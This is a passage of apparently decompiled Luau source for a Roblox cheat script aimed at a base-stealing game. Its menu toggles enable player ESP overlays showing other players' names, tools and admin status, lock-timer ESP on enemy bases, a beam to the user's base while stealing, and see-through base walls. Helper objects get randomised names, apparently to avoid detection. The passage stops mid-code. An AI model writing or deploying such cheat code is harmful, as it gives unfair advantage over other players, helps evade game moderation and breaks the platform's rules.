				local character_ = k.Character

				if character_ and character_:IsDescendantOf(Workspace) then
					local tag = v9.Tag
					local billboard = tag and tag.Billboard
					tag = tag and tag.PlayerHighlight
					local adornee = billboard and billboard.Adornee
					local parent = billboard and billboard.Parent and adornee and adornee:IsDescendantOf(character_) and tag and tag.Parent and fn33(v9)

					if (v9.Character ~= character_ or not parent) and v9.BindingCharacter ~= character_ then
						fn48(v9, k, character_)
					end
				elseif v9.Character then
					v9.Version = v9.Version + 1
					fn47(v9)
				end
			end
		end

		local function fn52()
			flag9 = false
			n11 += 1
			disconnectAll2(connections2)
			local ks = {}

			for k in pairs(playerMap) do
				ks[#ks + 1] = k
			end

			for _, v9 in ipairs(ks) do
				fn49(v9)
			end
		end

		local function fn53()
			for _, v9 in pairs(playerMap) do
				if v9.Tag and v9.Tag.Billboard.Parent then
					fn20(v9.Tag, v9.Tag.HasTool == true)
				end
			end
		end

		local function fn54()
			for _, v9 in pairs(playerMap) do
				if v9.Tag and v9.Tag.Billboard.Parent then
					fn36(v9)
					fn37(v9)
				end
			end
		end

		local function fn55()
			fn52()
			flag9 = true
			local n112 = n11
			connections2[#connections2 + 1] = Players.PlayerAdded:Connect(fn50)
			connections2[#connections2 + 1] = Players.PlayerRemoving:Connect(fn49)
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				connections2[#connections2 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn53)
			end

			for _, player in ipairs(Players:GetPlayers()) do
				fn50(player)
			end

			task.spawn(function()
				while flag9 and n11 == n112 do
					task.wait(0.2)

					if flag9 and n11 == n112 then
						fn51()
					end
				end
			end)
		end

		cleanup.Event:Connect(fn52)
		chilliPlayerESPRuntime.Destroying:Connect(fn52)

		playerEspSection:CreateToggle({
			Name = "Player ESP",
			Default = true,
			Callback = function(arg)
				if arg then
					fn55()
				else
					fn52()
				end
			end,
		})

		playerEspSection:CreateMultiDropdown({
			Name = "Show Information",
			Note = "Choose what Player ESP shows. Username replaces the display name.",
			Options = { "Name", "Username", "Avatar", "Tool", "Brainrot", "Admin Panel" },
			Default = { "Name", "Tool", "Brainrot", "Admin Panel" },
			Callback = function(arg)
				local enabledFlags3 = {
					Name = false,
					Username = false,
					Avatar = false,
					Tool = false,
					Brainrot = false,
					["Admin Panel"] = false,
				}

				if type(arg) == "table" then
					for k, v9 in pairs(arg) do
						if type(v9) == "string" and enabledFlags3[v9] ~= nil then
							enabledFlags3[v9] = true
						elseif type(k) == "string" and v9 == true and enabledFlags3[k] ~= nil then
							enabledFlags3[k] = true
						end
					end
				end

				enabledFlags2 = enabledFlags3
				fn54()
			end,
		})

		playerEspSection:CreateSlider({
			Name = "ESP Size",
			Min = 50,
			Max = 200,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				n10 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
				fn53()
			end,
		})
	end

	chilliBaseLockTimerRuntime, v = fn3("__ChilliBaseLockTimerRuntime")
	flag2 = false
	n = 1
	v2 = nil
	folder = nil
	childMap = {}
	connections = {}

	do
		local color = Color3.fromRGB(255, 58, 74)
		local color2 = Color3.fromRGB(154, 255, 62)
		local colorSequenceNew = ColorSequence.new
		local tbl6 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(222, 222, 222))
		tbl6[1] = colorKeypoint
		tbl6[2] = colorKeypoint2

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
			table.move(values, 1, values.n, 3, tbl6)
		end

		local v9 = colorSequenceNew(tbl6)

		local function clampValue()
			local currentCamera = Workspace.CurrentCamera
			local n12 = math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.064, 52, 76))
			return math.floor(n12 * 2.8), n12
		end

		fn9 = function(arg)
			if not arg.Tag or not arg.Tag.Gui or not arg.Tag.Gui.Parent then
				return
			end
			local numVal, v10 = clampValue()
			arg.Tag.Gui.Size = UDim2.fromOffset(math.floor(numVal * n + 0.5), math.floor(v10 * n + 0.5))
		end

		local function createPart(arg)
			local v10 = fn14(arg)
			if not v10 then
				return nil
			end
			local part = Instance.new("Part")
			part.Name = generateRandomId()
			part.Size = Vector3.one
			part.Transparency = 1
			part.Anchored = true
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CastShadow = false
			part.Position = v10
			part.Parent = folder
			return part
		end

		fn10 = function(arg)
			local part = createPart(arg)
			if not part then
				return nil
			end
			local baseLockTimer = Instance.new("BillboardGui")
			baseLockTimer.Name = "BaseLockTimer"
			baseLockTimer.Adornee = part
			baseLockTimer.AlwaysOnTop = true
			baseLockTimer.LightInfluence = 0
			baseLockTimer.MaxDistance = 2500
			baseLockTimer.Parent = chilliBaseLockTimerRuntime
			local frame = Instance.new("Frame")
			frame.Name = "Frame"
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = baseLockTimer
			local status = Instance.new("TextLabel")
			status.Name = "Status"
			status.BackgroundTransparency = 1
			status.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			status.Position = UDim2.fromScale(0.02, 0)
			status.Size = UDim2.fromScale(0.96, 0.53)
			status.Text = "Open"
			status.TextColor3 = color2
			status.TextScaled = true
			status.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			status.TextStrokeTransparency = 0
			status.Parent = frame
			local textOutline = Instance.new("UIStroke")
			textOutline.Name = "TextOutline"
			textOutline.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			textOutline.Color = status.TextStrokeColor3
			textOutline.LineJoinMode = Enum.LineJoinMode.Round
			textOutline.Thickness = 2.1
			textOutline.Transparency = 0
			textOutline.Parent = status
			local sheen = Instance.new("UIGradient")
			sheen.Name = "Sheen"
			sheen.Color = v9
			sheen.Rotation = 90
			sheen.Parent = status
			local timer = Instance.new("TextLabel")
			timer.Name = "Timer"
			timer.BackgroundTransparency = 1
			timer.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			timer.Position = UDim2.fromScale(0.02, 0.43)
			timer.Size = UDim2.fromScale(0.96, 0.57)
			timer.Text = ""
			timer.TextColor3 = Color3.fromRGB(255, 255, 255)
			timer.TextScaled = true
			timer.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			timer.TextStrokeTransparency = 0
			timer.Visible = false
			timer.Parent = frame
			local sheen2 = Instance.new("UIGradient")
			sheen2.Name = "Sheen"
			sheen2.Color = v9
			sheen2.Rotation = 90
			sheen2.Parent = timer
			local textOutline2 = Instance.new("UIStroke")
			textOutline2.Name = "TextOutline"
			textOutline2.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			textOutline2.Color = timer.TextStrokeColor3
			textOutline2.LineJoinMode = Enum.LineJoinMode.Round
			textOutline2.Thickness = 2.1
			textOutline2.Transparency = 0.05
			textOutline2.Parent = timer

			return {
				Gui = baseLockTimer,
				Anchor = part,
				Status = status,
				StatusStroke = textOutline,
				Timer = timer,
				TimerStroke = textOutline2,
				StatusStyleSource = nil,
				TimerStyleSource = nil,
				StatusMode = nil,
			}
		end

		local function fn21(arg, arg2, arg3, textColor3)
			if arg3 and arg3:IsA("TextLabel") then
				arg.FontFace = arg3.FontFace
				arg.TextColor3 = arg3.TextColor3
				arg.TextStrokeColor3 = arg3.TextStrokeColor3
				arg.TextStrokeTransparency = arg3.TextStrokeTransparency
			else
				arg.TextColor3 = textColor3
			end

			arg2.Color = arg.TextStrokeColor3
			arg2.Transparency = math.clamp(arg.TextStrokeTransparency * 0.35, 0, 0.35)
		end

		local function fn22(arg)
			local str = tostring(arg or "")
			local n12 = tonumber(str:match("(%d+)%s*[mM]")) or 0
			local num = tonumber(str:match("(%d+)%s*[sS]"))

			if num == nil and n12 == 0 then
				num = tonumber(str:match("%d+")) or 0
			end

			return n12 * 60 + (num or 0)
		end

		fn11 = function(arg)
			if arg.Tag then
				local anchor = arg.Tag.Anchor
				if not anchor or not anchor.Parent then
					arg.Tag.Gui.Enabled = false
					return
				end
				local v10 = fn14(arg.Base)

				if v10 and anchor.Position ~= v10 then
					anchor.Position = v10
				end

				local locked = nil
				local open = nil
				local flag10 = false
				local n12 = -1
				local v11 = nil
				local timerLabel = nil

				for _, timerLabel2 in ipairs(arg.TimerLabels) do
					if timerLabel2.Parent then
						local locked2 = timerLabel2.Parent:FindFirstChild("Locked")
						local open2 = timerLabel2.Parent:FindFirstChild("Open") or timerLabel2.Parent:FindFirstChild("Unlocked")

						if not locked and locked2 and locked2:IsA("TextLabel") then
							locked = locked2
						end

						if not open and open2 and open2:IsA("TextLabel") then
							open = open2
						end

						if timerLabel2.Visible or locked2 and locked2:IsA("GuiObject") and locked2.Visible then
							local str = tostring(timerLabel2.Text or "")
							local v12 = fn22(str)
							flag10 = true
							local flag11 = true

							if not (n12 < v12) then
								flag10 = flag11
							else
								n12 = v12
								v11 = str
								timerLabel = timerLabel2
							end
						end
					end
				end

				arg.Tag.Gui.Enabled = not string.find(string.lower(fn13(arg.Base)), "empty base", 1, true)

				if arg.Tag.Gui.Enabled then
					if flag10 then
						arg.Tag.Status.Position = UDim2.fromScale(0.02, 0)
						arg.Tag.Status.Size = UDim2.fromScale(0.96, 0.53)
						arg.Tag.Status.Text = "Locked:"
						arg.Tag.Timer.Text = v11 or ""
						arg.Tag.Timer.Visible = v11 ~= nil and v11 ~= ""

						if arg.Tag.StatusMode ~= "Locked" or arg.Tag.StatusStyleSource ~= locked then
							arg.Tag.StatusMode = "Locked"
							arg.Tag.StatusStyleSource = locked
							fn21(arg.Tag.Status, arg.Tag.StatusStroke, locked, color)
						end

						if arg.Tag.TimerStyleSource ~= timerLabel then
							arg.Tag.TimerStyleSource = timerLabel
							fn21(arg.Tag.Timer, arg.Tag.TimerStroke, timerLabel, Color3.fromRGB(255, 255, 255))
						end
					else
						arg.Tag.Status.Position = UDim2.fromScale(0.08, 0.15)
						arg.Tag.Status.Size = UDim2.fromScale(0.84, 0.7)
						arg.Tag.Status.Text = "Open"
						arg.Tag.Timer.Text = ""
						arg.Tag.Timer.Visible = false
						open = open or locked

						if arg.Tag.StatusMode ~= "Open" or arg.Tag.StatusStyleSource ~= open then
							arg.Tag.StatusMode = "Open"
							arg.Tag.StatusStyleSource = open
							fn21(arg.Tag.Status, arg.Tag.StatusStroke, open, color2)
							arg.Tag.Status.TextColor3 = color2
						end
					end
				end
			end
		end
	end
end

do
	local function fn12(arg)
		disconnectAll(arg.TimerConnections)
		table.clear(arg.TimerLabels)
		if not arg.Base.Parent then
			return
		end

		for _, descendant in ipairs(arg.Base:GetDescendants()) do
			if descendant:IsA("TextLabel") and descendant.Name == "RemainingTime" then
				arg.TimerLabels[#arg.TimerLabels + 1] = descendant

				arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Text"):Connect(function()
					fn11(arg)
				end)

				arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Visible"):Connect(function()
					fn11(arg)
				end)

				local locked = descendant.Parent and descendant.Parent:FindFirstChild("Locked")

				if locked and locked:IsA("GuiObject") then
					arg.TimerConnections[#arg.TimerConnections + 1] = locked:GetPropertyChangedSignal("Visible"):Connect(function()
						fn11(arg)
					end)
				end
			end
		end

		fn11(arg)
	end

	local function destroyAll(child)
		local childEntry = childMap[child]
		if not childEntry then
			return
		end
		disconnectAll(childEntry.Connections)
		disconnectAll(childEntry.TimerConnections)
		local tag = childEntry.Tag

		if tag and childEntry.Tag.Gui then
			childEntry.Tag.Gui:Destroy()
		end

		if childEntry.Tag and childEntry.Tag.Anchor then
			childEntry.Tag.Anchor:Destroy()
		end

		childMap[child] = nil
	end

	local function fn13(child)
		if not (not child:IsA("Model") or childMap[child]) then
			local v3 = fn10(child)

			if v3 then
				local tbl4 = {
					Base = child,
					Tag = v3,
					TimerLabels = {},
					Connections = {},
					TimerConnections = {},
					RefreshPending = false,
				}

				childMap[child] = tbl4
				fn9(tbl4)

				local function fn14(descendant)
					if not (descendant and descendant.Name ~= "RemainingTime" and descendant.Name ~= "Locked" and not isBasePart(descendant)) and not tbl4.RefreshPending then
						tbl4.RefreshPending = true

						task.defer(function()
							tbl4.RefreshPending = false

							if childMap[child] == tbl4 then
								fn12(tbl4)
							end
						end)

						return
					end
				end

				tbl4.Connections[#tbl4.Connections + 1] = child.DescendantAdded:Connect(fn14)
				tbl4.Connections[#tbl4.Connections + 1] = child.DescendantRemoving:Connect(fn14)

				tbl4.Connections[#tbl4.Connections + 1] = child.Destroying:Connect(function()
					destroyAll(child)
				end)

				local v4 = fn5(child)

				if v4 then
					tbl4.Connections[#tbl4.Connections + 1] = v4:GetPropertyChangedSignal("Text"):Connect(function()
						fn11(tbl4)
					end)
				end

				fn12(tbl4)
				return
			end
		end
	end

	local function fn14()
		for _, v3 in pairs(childMap) do
			fn9(v3)
		end
	end

	local function destroyAll2()
		flag2 = false
		disconnectAll(connections)
		local ks = {}

		for k in pairs(childMap) do
			ks[#ks + 1] = k
		end

		for _, v3 in ipairs(ks) do
			destroyAll(v3)
		end

		folder:Destroy()
		folder = nil
		v2 = nil
	end

	local function fn15(arg)
		v2 = arg
		connections[#connections + 1] = arg.ChildAdded:Connect(fn13)
		connections[#connections + 1] = arg.ChildRemoved:Connect(destroyAll)

		connections[#connections + 1] = arg.DescendantAdded:Connect(function(descendant)
			if isBasePart(descendant) then
				local parent = descendant.Parent

				if parent and parent.Parent == arg then
					fn13(parent)
				end
			end
		end)

		for _, child in ipairs(arg:GetChildren()) do
			fn13(child)
		end
	end

	local function fn16()
		destroyAll2()
		flag2 = true
		folder = Instance.new("Folder")
		folder.Name = generateRandomId()
		folder.Archivable = false
		folder.Parent = Workspace
		local currentCamera = Workspace.CurrentCamera

		if currentCamera then
			connections[#connections + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn14)
		end

		connections[#connections + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn14)
		local plots = Workspace:FindFirstChild("Plots")

		if plots then
			fn15(plots)
		else
			connections[#connections + 1] = Workspace.ChildAdded:Connect(function(child)
				if flag2 and child.Name == "Plots" then
					fn15(child)
				end
			end)
		end
	end

	v.Event:Connect(destroyAll2)
	chilliBaseLockTimerRuntime.Destroying:Connect(destroyAll2)

	local timerEspToggle = baseEspSection:CreateToggle({
		Name = "Timer ESP",
		Default = true,
		Callback = function(arg)
			if arg then
				fn16()
			else
				destroyAll2()
			end
		end,
	})

	baseEspSection:CreateSlider({
		Name = "Timer ESP Size",
		Min = 50,
		Max = 200,
		Default = 80,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = timerEspToggle,
		ShowWhen = timerEspToggle,
		Callback = function(arg)
			n = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
			fn14()
		end,
	})
end

local chilliYourBaseESPRuntime, v3
chilliYourBaseESPRuntime, v3 = fn3("__ChilliYourBaseESPRuntime")
Color3.fromRGB(255, 255, 255)
local flag3, flag4, flag5, v4, v5, v6, flag6, tbl4

do
	local enabledFlags = {
		AnimalPodiums = true,
		Unlock = true,
		PlotSign = true,
		Purchases = true,
		Conveyor = true,
		Walls = true,
		Wall = true,
		Floors = true,
		Floor = true,
		Roof = true,
		Decorations = true,
		Model = true,
		Laser = true,
		LaserHitbox = true,
		InvisibleWalls = true,
		Spawn = true,
	}

	flag3 = false
	flag4 = false
	flag5 = false
	v4 = nil
	v5 = nil
	v6 = nil
	local v7 = nil
	local v8 = nil
	local v9 = nil
	local v10 = nil
	local v11 = nil
	local v12 = nil
	flag6 = false
	local flag7 = false
	local tbl5 = {}
	local n2 = 0
	local tbl6 = {}
	local weakCache2 = setmetatable({}, { __mode = "k" })
	tbl4 = {}
	local tbl7 = {}
	local v13 = nil

	local function fn12(arg, arg2)
		local v14 = weakCache2[arg]
		if v14 ~= nil then
			return v14
		end
		local flag8 = false

		if not enabledFlags[arg.Name] then
			if arg.Parent == arg2 then
				flag8 = true
			elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") or arg:GetAttribute("Mutation") ~= nil then
				flag8 = true
			end
		end

		if flag8 or #arg:GetChildren() > 0 then
			weakCache2[arg] = flag8
		end

		return flag8
	end

	local function fn13(arg, arg2)
		if not (not arg:IsA("BasePart") or arg.Transparency >= 1) and arg.Name ~= "PlotSign" then
			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("SurfaceGui") or child:IsA("BillboardGui") or child:IsA("Decal") or child:IsA("Texture") then
					return false
				end
			end

			while arg and arg ~= arg2 do
				if arg:IsA("Model") and fn12(arg, arg2) then
					return false
				end
				arg = arg.Parent
			end

			return arg == arg2
		end

		return false
	end

	local function fn14(arg, arg2)
		if tbl6[arg] ~= nil or not fn13(arg, arg2) or #tbl5 == 0 then
			return
		end
		n2 += 1
		local v14 = tbl5[(n2 - 1) % #tbl5 + 1]
		local color = arg.Color
		tbl6[arg] = color
		arg.Color = color:Lerp(v14, 0.78)
	end

	local function fn15()
		for k, v14 in pairs(tbl6) do
			if k.Parent then
				pcall(function()
					k.Color = v14
				end)
			end
		end

		table.clear(tbl6)
		table.clear(weakCache2)
		table.clear(tbl5)
		n2 = 0
		flag7 = false
	end

	local function fn16(arg)
		fn15()
		if not arg or not arg.Parent then
			return
		end
		tbl5 = fn8("Phantom")

		for _, descendant in ipairs(arg:GetDescendants()) do
			fn14(descendant, arg)
		end

		flag7 = true
	end

	local function destroyAll()
		if v7 then
			v7:Destroy()
		end

		if v8 then
			v8:Destroy()
		end

		v7 = nil
		v8 = nil
		v9 = nil
		v10 = nil
		v11 = nil
		v12 = nil
	end

	local function fn17()
		local flag8 = v5 ~= nil and localPlayer:GetAttribute("Stealing") == true
		local flag42 = flag8 and flag4
		flag8 = flag8 and flag5

		if flag42 and not flag7 then
			fn16(v5)
		elseif not flag42 and flag7 then
			fn15()
		end

		if v6 and v6.Parent then
			v6.Enabled = flag42
		end

		fn7("UnfadedPlot", (flag42 or flag8) and v5 or nil)
	end

	local function destroyAll2()
		if v13 then
			v13:Disconnect()
			v13 = nil
		end

		destroyAll()
		fn15()

		if v6 then
			v6:Destroy()
			v6 = nil
		end

		v5 = nil
		fn17()
	end

	local function fn18()
		flag3 = false
		flag6 = false
		disconnectAll(tbl4)
		disconnectAll(tbl7)
		destroyAll2()
		v4 = nil
	end

	local function fn19()
		fn17()
	end

	v3.Event:Connect(fn18)
	chilliYourBaseESPRuntime.Destroying:Connect(fn18)

	baseEspSection:CreateToggle({
		Name = "Your Base ESP (While Stealing)",
		Default = false,
		Callback = function(arg)
			flag4 = arg == true
			fn19()
		end,
	})

	baseEspSection:CreateToggle({
		Name = "Beam to Your Base (While Stealing)",
		Default = true,
		Callback = function(arg)
			flag5 = arg == true
			fn19()
		end,
	})
end

baseEspSection:CreateSlider({
	Name = "Base Transparency",
	Min = 0,
	Max = 100,
	Default = 80,
	AllowDecimals = false,
	Increment = 1,
	Unit = "%",
	ShowWhen = baseEspSection:CreateToggle({
		Name = "Clear Base",
		Default = false,
		Callback = function(arg)
			fn7("YourBaseClear", arg == true)
		end,
	}),
	Note = "Adjusts base visibility: 0% keeps the original look and 100% makes it invisible.",
	Callback = function(arg)
		fn7("ClearBaseTransparency", math.clamp(tonumber(arg) or 80, 0, 100) / 100)
	end,
})

local n2
n2 = math.clamp(tonumber(tbl3.ClearBaseTransparency) or 0.8, 0, 1)
local n3
n3 = 0.0015
local chilliFadePlotsRuntime, cleanup, flag7, n4, plots, connection, connection2

do
	local enabledFlags = {
		AnimalPodiums = true,
		Unlock = true,
		PlotSign = true,
		Purchases = true,
		Conveyor = true,
		Walls = true,
		Wall = true,
		Floors = true,
		Floor = true,
		Roof = true,
		Decorations = true,
	}

	local v7 = fn2()
	local tbl5 = {}

	for _, v8 in ipairs({ v7, CoreGui }) do
		if v8 and not tbl5[v8] then
			tbl5[v8] = true
			local chilliFadePlotsRuntime2 = v8:FindFirstChild("__ChilliFadePlotsRuntime")

			if chilliFadePlotsRuntime2 then
				local cleanup2 = chilliFadePlotsRuntime2:FindFirstChild("Cleanup")

				if cleanup2 and cleanup2:IsA("BindableEvent") then
					pcall(function()
						cleanup2:Fire()
					end)
				end

				pcall(function()
					chilliFadePlotsRuntime2:Destroy()
				end)
			end
		end
	end

	chilliFadePlotsRuntime = Instance.new("Folder")
	chilliFadePlotsRuntime.Name = "__ChilliFadePlotsRuntime"
	chilliFadePlotsRuntime.Archivable = false
	chilliFadePlotsRuntime.Parent = v7
	cleanup = Instance.new("BindableEvent")
	cleanup.Name = "Cleanup"
	cleanup.Parent = chilliFadePlotsRuntime
	flag7 = false
	n4 = 0
	plots = nil
	connection = nil
	connection2 = nil
	local rng = Random.new()
	local tbl6 = {}
	local n5 = 0
	local flag8 = false
	local v8 = nil
	local kMap = {}
	local weakCache2 = setmetatable({}, { __mode = "k" })

	local function fn12(arg)
		while arg do
			local parent = arg.Parent
			if parent == plots then
				return arg
			end

			if not parent or parent == Workspace then
				break
			end
			arg = parent
		end

		return nil
	end

	local function fn13(arg, arg2)
		local v9 = weakCache2[arg]
		if v9 ~= nil then
			return v9
		end
		local flag9 = false

		if not enabledFlags[arg.Name] then
			if arg.Parent == arg2 then
				flag9 = true
			elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") then
				flag9 = true
			end
		end

		if flag9 or #arg:GetChildren() > 0 then
			weakCache2[arg] = flag9
		end

		return flag9
	end

	local function fn14(arg, arg2)
		while arg and arg ~= arg2 do
			if arg:IsA("Model") and fn13(arg, arg2) then
				return true
			end
			arg = arg.Parent
		end

		return false
	end

	local function fn15(arg)
		if kMap[arg] == nil and arg:IsA("BasePart") and not (arg.Transparency >= 1) then
			local v9 = fn12(arg)

			if not (not v9 or v9 == v8 or fn14(arg, v9)) then
				local localTransparencyModifier = arg.LocalTransparencyModifier

				if math.abs(localTransparencyModifier - n2) <= 0.001 then
					localTransparencyModifier = 0
				end

				kMap[arg] = localTransparencyModifier

				pcall(function()
					arg.LocalTransparencyModifier = math.max(localTransparencyModifier, n2)
				end)

				return
			end
		end
	end

	local function fn16()
		for k, v9 in pairs(kMap) do
			pcall(function()
				k.LocalTransparencyModifier = v9
			end)
		end

		table.clear(kMap)
		table.clear(weakCache2)
		table.clear(tbl6)
		n5 = 0
		flag8 = false
	end

	local function fn17(arg)
		for k, v9 in pairs(kMap) do
			if fn12(k) == arg then
				pcall(function()
					k.LocalTransparencyModifier = v9
				end)

				kMap[k] = nil
			end
		end
	end

	local function fn18(arg)
		if not (not arg or not arg.Parent) then
			for _, descendant in ipairs(arg:GetDescendants()) do
				fn15(descendant)
			end
		end
	end

	local function fn19(arg)
		if v8 ~= arg then
			local v82 = v8
			v8 = arg

			if flag7 then
				if arg then
					fn17(arg)
				end

				if v82 then
					fn18(v82)
				end
			end
		end
	end

	local function clampValue(arg)
		n2 = math.clamp(tonumber(arg) or 0.8, 0, 1)

		if flag7 then
			for k, v9 in pairs(kMap) do
				if k.Parent then
					pcall(function()
						k.LocalTransparencyModifier = math.max(v9, n2)
					end)
				else
					kMap[k] = nil
				end
			end
		end
	end

	fn6(function(arg, arg2)
		if arg == "UnfadedPlot" then
			local fn192 = fn19
			arg2 = typeof(arg2) == "Instance" and arg2
			fn192(arg2 or nil)
		elseif arg == "ClearBaseTransparency" then
			clampValue(arg2)
		end
	end)

	local function fn20(arg)
		n5 += 1
		tbl6[n5] = arg
		if flag8 then
			return
		end
		flag8 = true
		local n42 = n4

		task.delay(rng:NextNumber(0.18, 0.42), function()
			flag8 = false

			if not (not flag7 or n42 ~= n4) then
				local tbl62 = tbl6
				local n52 = n5
				tbl6 = {}
				n5 = 0

				for idx = 1, n52 do
					local v9 = tbl62[idx]

					if v9 and v9.Parent then
						fn15(v9)
					end
				end
			end
		end)
	end

	local function fn21()
		n4 += 1
		local n42 = n4

		task.spawn(function()
			local children = plots:GetChildren()
			local n6 = 1

			while flag7 and n42 == n4 and n6 <= #children do
				local now = os.clock()

				while true do
					local child = children[n6]
					n6 += 1

					if child then
						fn15(child)

						for _, child2 in ipairs(child:GetChildren()) do
							children[#children + 1] = child2
						end
					end

					if not (n6 > #children or os.clock() - now >= n3) then
						continue
					end
					break
				end

				if not (n6 <= #children) then
					continue
				end
				RunService.Heartbeat:Wait()
			end
		end)
	end

	local function fn22()
		connection:Disconnect()
		connection = nil

		connection = plots.DescendantAdded:Connect(function(descendant)
			if flag7 then
				fn20(descendant)
			end
		end)

		fn21()
	end

	local function fn23()
		flag7 = false
		n4 += 1
		connection:Disconnect()
		connection = nil
		connection2:Disconnect()
		connection2 = nil
		fn16()
	end

	local function fn24()
		fn23()
		flag7 = true
		plots = Workspace:FindFirstChild("Plots")
		if plots then
			fn22()
			return
		end

		connection2 = Workspace.ChildAdded:Connect(function(child)
			if flag7 and child.Name == "Plots" then
				plots = child
				connection2:Disconnect()
				connection2 = nil
				fn22()
			end
		end)
	end

	local function fn25()
		local flag9 = tbl3.YourBaseClear == true

		if flag9 and not flag7 then
			fn24()
		elseif not flag9 and flag7 then
			fn23()
		end
	end

	fn6(function(arg)
		if arg == "YourBaseClear" then
			fn25()
		end
	end)

	fn25()
	cleanup.Event:Connect(fn23)
	chilliFadePlotsRuntime.Destroying:Connect(fn23)
end

local chilliBrainrotESPRuntime, v7
chilliBrainrotESPRuntime, v7 = fn3("__ChilliBrainrotESPRuntime")
local font
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
local tbl5
tbl5 = {}
local tbl6
tbl6 = { Limit = 1000000, Outline = Color3.fromRGB(255, 232, 152) }

do
	local colorSequenceNew = ColorSequence.new
	local tbl7 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
	tbl7[1] = colorKeypoint
	tbl7[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(214, 142, 12)))
		table.move(values, 1, values.n, 3, tbl7)
	end

	tbl6.Text = colorSequenceNew(tbl7)
end

do
	local colorSequenceNew = ColorSequence.new
	local tbl7 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
	local colorSequenceKeypointNew = ColorSequenceKeypoint.new
	local color3FromRGB = Color3.fromRGB
	tbl7[1] = colorKeypoint
	tbl7[2] = colorKeypoint2

	do
		local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(20, 12, 0)))
		table.move(values, 1, values.n, 3, tbl7)
	end

	tbl6.Stroke = colorSequenceNew(tbl7)
end

local tbl7
tbl7 = { Limit = 10000000, Outline = Color3.fromRGB(255, 194, 112) }

do
	local colorSequenceNew = ColorSequence.new
	local tbl8 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
	tbl8[1] = colorKeypoint
	tbl8[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(206, 92, 0)))
		table.move(values, 1, values.n, 3, tbl8)
	end

	tbl7.Text = colorSequenceNew(tbl8)
end

do
	local colorSequenceNew = ColorSequence.new
	local tbl8 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
	tbl8[1] = colorKeypoint
	tbl8[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 8, 0)))
		table.move(values, 1, values.n, 3, tbl8)
	end

	tbl7.Stroke = colorSequenceNew(tbl8)
end

local tbl8
tbl8 = { Limit = 100000000, Outline = Color3.fromRGB(255, 160, 132) }

do
	local colorSequenceNew = ColorSequence.new
	local tbl9 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
	tbl9[1] = colorKeypoint
	tbl9[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(196, 42, 0)))
		table.move(values, 1, values.n, 3, tbl9)
	end

	tbl8.Text = colorSequenceNew(tbl9)
end

do
	local colorSequenceNew = ColorSequence.new
	local tbl9 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
	tbl9[1] = colorKeypoint
	tbl9[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 4, 0)))
		table.move(values, 1, values.n, 3, tbl9)
	end

	tbl8.Stroke = colorSequenceNew(tbl9)
end

do
	local tbl9 = { Limit = math.huge, Outline = Color3.fromRGB(255, 128, 138) }
	local colorSequenceNew = ColorSequence.new
	local tbl10 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
